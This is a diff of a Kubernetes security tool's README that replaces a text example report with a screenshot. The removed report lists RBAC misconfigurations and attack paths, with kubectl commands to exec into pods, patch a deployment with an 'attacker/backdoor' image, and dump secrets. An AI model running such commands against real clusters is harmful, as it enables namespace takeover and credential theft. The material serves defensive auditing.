@@ -153,42 +153,8 @@ you> investigate sa/deployer -n staging
 | `sa/<name> -n <namespace>` | Escalation paths from a ServiceAccount |
 
 **Example output:**
-```
-⚡ Investigating: pod/pod-developer -n test-custom
+<img width="2467" height="1222" alt="kubeconfess-investigate" src="https://github.com/user-attachments/assets/64f77d44-ae06-4d0e-a9a7-8433db6a6454" />
 
-STARTING POINT
-  pod/pod-developer in test-custom running as developer-sa
-  Bound to developer-role via RoleBinding developer-binding
-  Baseline: get/list/watch pods, create pods/exec, get/list secrets, patch deployments
-
-FINDINGS
-  ⚠ CRITICAL — create pods/exec allowed — RCE into any pod in namespace
-  ⚠ HIGH     — get/list secrets — all secrets in namespace readable
-  ⚠ HIGH     — patch deployments — can inject malicious containers
-  ⚠ HIGH     — all pods run as root — no securityContext set
-
-ATTACK PATHS
-  1. Read injected SA token → exec into any pod in test-custom
-     kubectl exec -it app-deployment-7648b5cb9 -n test-custom -- /bin/sh
-
-  2. Patch deployment to inject malicious image → root shell in all replicas
-     kubectl patch deployment app-deployment -n test-custom -p \
-       '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"attacker/backdoor"}]}}}}'
-
-  3. Read secrets → extract DB credentials, API keys, cloud credentials
-     kubectl get secret db-credentials -n test-custom -o jsonpath='{.data}'
-
-BLAST RADIUS
-  Full control of test-custom namespace. Readable secrets expose production
-  database credentials and cloud keys. Deployment patch gives persistent
-  root access across all replicas.
-
-RECOMMENDED FIXES
-  1. Remove create pods/exec — scope to specific pods if needed
-  2. Remove secrets get/list — use projected volumes with specific keys
-  3. Remove patch/update on deployments
-  4. Set securityContext.runAsNonRoot: true on all containers
-```
 
 After the report prints you stay in the chat — ask follow-up questions grounded in the findings:
 
